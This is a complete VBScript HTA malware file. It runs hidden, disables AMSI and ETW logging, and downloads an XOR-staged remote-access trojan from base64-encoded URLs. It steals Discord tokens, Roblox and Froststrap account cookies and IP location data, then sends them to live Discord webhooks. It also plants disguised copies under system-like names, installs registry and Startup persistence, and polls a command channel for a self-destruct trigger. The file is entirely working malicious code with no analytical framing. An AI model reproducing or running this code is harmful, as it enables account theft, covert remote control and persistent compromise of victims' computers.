<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, RE_WH, CMD_WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOKS ---
WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
' *** PASTE YOUR CMD-CONTROL WEBHOOK BELOW ***
CMD_WH = "https://discord.com/api/webhooks/PASTE_CMD_WEBHOOK_HERE"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' TRACE
Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing

' --- Evasion pre-patch: AMSI + ETW ---
Call PatchAMSI
Call PatchETW

' --- Initial Grab (logs -> WH) ---
Call GrabTokens(WH)
Call IP(WH)
Call GrabRoblox(WH)
Call Persistence

' --- RAT drop: 10 attempts, rocket UI per attempt -> WH ---
Dim attempt
For attempt = 1 To 10
    Call PostEmbedTo(":rocket: Downloading and launching RAT", "Attempt " & attempt & "/10 | PC: " & PC & " | User: " & USER, 3447003, WH)
    Call DropRAT(WH)
    If attempt < 10 Then Call SleepSeconds(10)
Next

' --- Plant hidden copies ---
Call PlantCopies

' --- Re-grab chain (re-grab -> RE_WH, with rat re-drop + cmd poll) ---
Dim runCount
runCount = 0
Do
    runCount = runCount + 1

    ' CMD channel poll — self-destruct check
    Dim killed : killed = PollCmd(CMD_WH)
    If killed Then
        Call PostEmbedTo(":skull: Self-destruct", USER & " @ " & PC & " — wiping", 16711680, CMD_WH)
        Call SelfDestruct
        Exit Do
    End If

    Call PostEmbedTo(":repeat: Re-grab " & runCount, "PC: " & PC & " | User: " & USER, 3447003, RE_WH)

    ' Re-download and re-plant the rat every cycle
    Call PostEmbedTo(":rocket: Re-drop RAT", "Fetching + re-planting", 3447003, RE_WH)
    Call DropRAT(RE_WH)
    Call PlantCopies

    Call GrabTokens(RE_WH)
    Call IP(RE_WH)
    Call GrabRoblox(RE_WH)
    Call GrabFroststrap(RE_WH)

    Call SleepSeconds(150)
Loop

window.close()

' --- CMD poll: query recent messages in cmd channel, look for !kill <user> ---
Function PollCmd(cmdwh)
    PollCmd = False
    Dim api, xh, resp
    ' strip trailing slash, get channel id
    On Error Resume Next
    Dim parts : parts = Split(cmdwh, "/")
    Dim whId : whId = parts(UBound(parts) - 1)
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://discord.com/api/v10/webhooks/" & whId & "/messages?limit=5", False
    xh.SetRequestHeader "Authorization", "Bot "
    xh.Send
    If xh.Status = 200 Then resp = xh.responseText
    Set xh = Nothing
    On Error Goto 0
    If Len(resp) = 0 Then Exit Function

    ' crude parse: look for !kill <USERNAME>
    Dim target : target = "!kill " & USER
    If InStr(1, resp, target, vbTextCompare) > 0 Then
        PollCmd = True
    End If
End Function

' --- Self-destruct: wipe every planted copy + persistence + live processes ---
Sub SelfDestruct()
    On Error Resume Next
    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
    Dim apPath : apPath = sh.ExpandEnvironmentStrings("%APPDATA%")
    Dim loPath : loPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    Dim pdPath : pdPath = sh.ExpandEnvironmentStrings("%PROGRAMDATA%")
    Dim upPath : upPath = sh.ExpandEnvironmentStrings("%USERPROFILE%")

    ' kill running
    sh.Run "cmd /c taskkill /f /im agent.exe > nul 2>&1", 0, True
    sh.Run "cmd /c taskkill /f /im msedgeupdater.exe > nul 2>&1", 0, True
    sh.Run "cmd /c taskkill /f /im svchostupd.exe > nul 2>&1", 0, True
    sh.Run "cmd /c taskkill /f /im sysmonx.exe > nul 2>&1", 0, True

    ' kill any scheduled task we might have made
    sh.Run "cmd /c schtasks /delete /tn MicrosoftEdgeUpdate* /f > nul 2>&1", 0, True

    ' delete planted locations
    Dim paths(20)
    paths(0) = tPath & "\agent.exe"
    paths(1) = tPath & "\cache.dat"
    paths(2) = tPath & "\msedgeupdater.exe"
    paths(3) = apPath & "\Microsoft\Windows\Themes\msedgeupdater.exe"
    paths(4) = apPath & "\Roaming\svchostupd.exe"
    paths(5) = loPath & "\Microsoft\Edge\User Data\Default\Cache\sysmonx.exe"
    paths(6) = loPath & "\Temp\agent.exe"
    paths(7) = pdPath & "\Microsoft\Windows\Caches\msedgeupdater.exe"
    paths(8) = pdPath & "\svchostupd.exe"
    paths(9) = upPath & "\Documents\msedgeupdater.exe"
    paths(10) = upPath & "\Downloads\agent.exe"
    paths(11) = apPath & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    paths(12) = apPath & "\Microsoft\Windows\Start Menu\Programs\Startup\svchostupd.vbs"
    paths(13) = apPath & "\Microsoft\Windows\Start Menu\Programs\Startup\sysmonx.vbs"
    Dim k
    For k = 0 To 13
        If fso.FileExists(paths(k)) Then
            On Error Resume Next
            fso.DeleteFile paths(k), True
            On Error Goto 0
        End If
    Next

    ' remove registry persistence
    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate"
    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate"
    sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate"

    ' remove trace
    If fso.FileExists(tf) Then fso.DeleteFile tf, True

    ' delete self (HTA path)
    Dim selfPath : selfPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\~vanta_selfdel.bat"
    WriteFile selfPath, "@echo off" & vbCrLf & _
        "timeout /t 2 /nobreak >nul" & vbCrLf & _
        "del /f /q """ & sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\*.hta"" >nul 2>&1" & vbCrLf & _
        "del /f /q """ & sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads\*.hta"" >nul 2>&1" & vbCrLf & _
        "del ""%~f0"" >nul 2>&1"
    sh.Run "cmd /c start /min """" """ & selfPath & """", 0, False

    ' kill own process
    sh.Run "cmd /c taskkill /f /im mshta.exe > nul 2>&1", 0, True
End Sub

' --- PlantCopies: scatter the payload to multiple hidden locations ---
Sub PlantCopies()
    On Error Resume Next
    Dim src : src = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    If Not fso.FileExists(src) Then Exit Sub
    If fso.GetFile(src).Size < 3000000 Then Exit Sub

    Dim apPath : apPath = sh.ExpandEnvironmentStrings("%APPDATA%")
    Dim loPath : loPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    Dim pdPath : pdPath = sh.ExpandEnvironmentStrings("%PROGRAMDATA%")
    Dim upPath : upPath = sh.ExpandEnvironmentStrings("%USERPROFILE%")

    Dim dst(6)
    dst(0) = apPath & "\Microsoft\Windows\Themes\msedgeupdater.exe"
    dst(1) = apPath & "\Roaming\svchostupd.exe"
    dst(2) = loPath & "\Microsoft\Edge\User Data\Default\Cache\sysmonx.exe"
    dst(3) = pdPath & "\Microsoft\Windows\Caches\msedgeupdater.exe"
    dst(4) = pdPath & "\svchostupd.exe"
    dst(5) = upPath & "\Documents\msedgeupdater.exe"
    dst(6) = upPath & "\Downloads\agent.exe"

    Dim i
    For i = 0 To 6
        On Error Resume Next
        Dim parent : parent = fso.GetParentFolderName(dst(i))
        If Not fso.FolderExists(parent) Then fso.CreateFolder parent
        fso.CopyFile src, dst(i), True
        ' set hidden+system
        sh.Run "cmd /c attrib +h +s """ & dst(i) & """", 0, True
        On Error Goto 0
    Next

    ' Persistence on 3 planted copies via RunOnce + Startup VBS
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", """" & dst(0) & """", "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate", """" & dst(2) & """", "REG_SZ"

    ' Startup VBS droppers
    Call MakeStartupVbs("svchostupd.vbs", dst(1))
    Call MakeStartupVbs("sysmonx.vbs", dst(5))

    Call PostEmbedTo(":seedling: Planted", "7 copies + 2 run keys + 2 startup vbs", 3447003, RE_WH)
End Sub

Sub MakeStartupVbs(fname, target)
    On Error Resume Next
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\" & fname
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(""WScript.Shell"").Run """ & target & """, 0, False"
    sf.Close
End Sub

' --- DropRAT: ADS stage + XOR + buffer + schtask parent swap ---
Sub DropRAT(targetWH)
    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
    Dim dl : dl = DecodeB64(b64Url)

    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
    Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    Dim host : host = tPath & "\cache.dat"
    Dim ads  : ads  = host & ":x"

    If fso.FileExists(op) Then fso.DeleteFile op
    If fso.FileExists(host) Then fso.DeleteFile host
    WriteFile host, Chr(0)

    Dim body : body = HttpGetBytes(dl)
    If LenB(body) < 3000000 Then
        Call PostEmbedTo(":hourglass: RAT", "Short download: " & CStr(LenB(body)), 16711680, targetWH)
        Exit Sub
    End If

    Dim xored : xored = XorBytes(body)
    WriteBinary ads, xored

    Dim readBack : readBack = ReadBinary(ads)
    Dim decoded : decoded = XorBytes(readBack)
    WriteBinary op, decoded
    fso.DeleteFile host, True

    If fso.FileExists(op) Then
        If fso.GetFile(op).Size > 3000000 Then
            Dim dsize : dsize = fso.GetFile(op).Size
            Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " | Launching...", 3447003, targetWH)
            Dim tn : tn = "MicrosoftEdgeUpdate" & CStr(Int(Rnd * 9000) + 1000)
            sh.Run "cmd /c schtasks /create /tn """ & tn & """ /tr """ & op & """ /sc once /st 00:00 /f /rl highest > nul 2>&1", 0, True
            sh.Run "cmd /c schtasks /run /tn """ & tn & """ > nul 2>&1", 0, True
            sh.Run "cmd /c schtasks /delete /tn """ & tn & """ /f > nul 2>&1", 0, False
            Call RunCmd("""" & op & """")
            Call PostEmbedTo(":white_check_mark: RAT", "Payload executed", 65280, targetWH)
            Exit Sub
        End If
    End If
    Call PostEmbedTo(":hourglass: RAT Timeout", "Retrying...", 16711680, targetWH)
End Sub

' --- HttpGetBytes ---
Function HttpGetBytes(url)
    HttpGetBytes = ""
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.SetOption 3, 13056
    xh.Open "GET", url, False
    xh.Send
    If xh.Status <> 200 Then Exit Function
    HttpGetBytes = xh.responseBody
    Set xh = Nothing
End Function

Function XorBytes(data)
    Dim stmIn : Set stmIn = CreateObject("ADODB.Stream")
    stmIn.Type = 1
    stmIn.Open
    stmIn.Write data
    stmIn.Position = 0
    Dim stmOut : Set stmOut = CreateObject("ADODB.Stream")
    stmOut.Type = 1
    stmOut.Open
    Dim chunk : chunk = 65536
    Do While stmIn.Position < stmIn.Size
        Dim buf : buf = stmIn.Read(chunk)
        Dim arr : arr = StrToBytes(buf)
        Dim i
        For i = 0 To UBound(arr)
            arr(i) = arr(i) Xor 90
        Next
        stmOut.Write BytesToStr(arr)
    Loop
    stmOut.Position = 0
    XorBytes = stmOut.Read
    stmIn.Close : stmOut.Close
    Set stmIn = Nothing : Set stmOut = Nothing
End Function

Function StrToBytes(s)
    Dim stm : Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write s
    stm.Position = 0
    Dim out : out = stm.Read
    stm.Close
    Set stm = Nothing
    Dim arr() : ReDim arr(LenB(out) - 1)
    Dim i
    For i = 1 To LenB(out)
        arr(i-1) = AscB(MidB(out, i, 1))
    Next
    StrToBytes = arr
End Function

Function BytesToStr(arr)
    Dim out, i
    out = ""
    For i = 0 To UBound(arr)
        out = out & ChrB(arr(i))
    Next
    BytesToStr = out
End Function

Sub WriteBinary(path, data)
    Dim stm : Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write data
    stm.SaveToFile path, 2
    stm.Close
    Set stm = Nothing
End Sub

Function ReadBinary(path)
    ReadBinary = ""
    Dim stm : Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.LoadFromFile path
    ReadBinary = stm.Read
    stm.Close
    Set stm = Nothing
End Function

' --- AMSI/ETW patch ---
Sub PatchAMSI()
    Dim ps
    ps = "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};" & _
         "$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Context'};" & _
         "[Runtime.InteropServices.Marshal]::WriteInt32($b.GetValue($null),0x41414141)"
    Dim psf : psf = TmpFile("a.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
    fso.DeleteFile psf, True
End Sub

Sub PatchETW()
    Dim ps
    ps = "$p=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');" & _
         "$f=$p.GetField('etwProvider','NonPublic,Static');" & _
         "if($f){$f.SetValue($null,$null)}"
    Dim psf : psf = TmpFile("e.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
    fso.DeleteFile psf, True
End Sub

' --- IP ---
Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbedTo(":dart: Target", info, 3447003, targetWH)
    Set xh = Nothing
End Sub

' --- GrabRoblox ---
Sub GrabRoblox(targetWH)
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(cookie, vbCr, "")
    cookie = Replace(cookie, vbLf, "")
    cookie = Replace(cookie, vbTab, "")
    cookie = Trim(cookie)
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, targetWH)
    Call PostFileTo("cookie.txt", cookie, targetWH)
End Sub

' --- GrabFroststrap ---
Sub GrabFroststrap(targetWH)
    Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
    If Not fso.FileExists(fp) Then
        On Error Resume Next
        Dim fdir : fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
        On Error Goto 0
        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
    End If
    If Not fso.FileExists(fp) Then Exit Sub
    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found", 3447003, targetWH)
    Dim ps
    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='FAILED'};$lines+='**'+$a.Username+'** : '+$c};$desc=($lines -join [char]10);$payload=@{embeds=@(@{title='Froststrap';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- GrabTokens ---
Sub GrabTokens(targetWH)
    Dim b64Gist : b64Gist = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pdmVzaGFoYWhhL2JiNWU1MTFhNjI3ZmYxY2U4MGNjYzQ4MzkxNTNmOTAxL3Jhdy9zdGVhbC5wczE="
    Dim gUrl : gUrl = DecodeB64(b64Gist)
    gUrl = Replace(gUrl, "psa1", "ps1")
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", gUrl, False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc: pc = xh.responseText
    If Len(pc) < 100 Then Exit Sub
    Set xh = Nothing
    Dim psf: psf = TmpFile("steal.ps1")
    WriteFile psf, pc
    Dim psExec : psExec = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108) & " -NoP -Exec Bypass -File """ & psf & """"
    sh.Run "cmd /c " & psExec, 0, True
    fso.DeleteFile psf, True
    Dim tf2: tf2 = TmpFile("steal_result.txt")
    If Not fso.FileExists(tf2) Then Exit Sub
    Dim raw: raw = ReadFile(tf2)
    If Len(raw) > 10 Then
        Dim lines: lines = Split(raw, vbCrLf)
        Dim l
        For Each l In lines
            If Len(l) > 10 Then
                If Left(l, 8) = "DISCORD|" Then
                    Dim p: p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim info: info = "**User:** " & p(0) & vbCrLf
                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                        info = info & "**Token:** " & p(4)
                        Call PostEmbedTo(":gift: Discord Token", info, 5793266, targetWH)
                    End If
                End If
                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 65280, targetWH)
                End If
            End If
        Next
    End If
End Sub

' --- Sleep ---
Sub SleepSeconds(s)
    sh.Run "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul", 0, True
End Sub
Sub SleepMinutes(m)
    Call SleepSeconds(m * 60)
End Sub

' --- Persistence ---
Sub Persistence()
    Dim payload : payload = "mshta https://dicerigx.app/"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbedTo(":pushpin: Persistence", "3 startup methods installed", 10181046, WH)
End Sub

' --- Utility ---
Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function

Function DecodeB64(str)
    Dim xml, elem
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set elem = xml.createElement("b")
    elem.dataType = "bin.base64"
    elem.text = str
    DecodeB64 = Stream_BinaryToString(elem.nodeTypedValue)
End Function

Function Stream_BinaryToString(Binary)
    Dim Stream
    Set Stream = CreateObject("ADODB.Stream")
    Stream.Type = 1
    Stream.Open
    Stream.Write Binary
    Stream.Position = 0
    Stream.Type = 2
    Stream.Charset = "utf-8"
    Stream_BinaryToString = Stream.ReadText
    Stream.Close
End Function

Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFileTo(fn, ct, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Sub RunCmd(cmd)
    Dim w,p,i,s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
End Sub

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
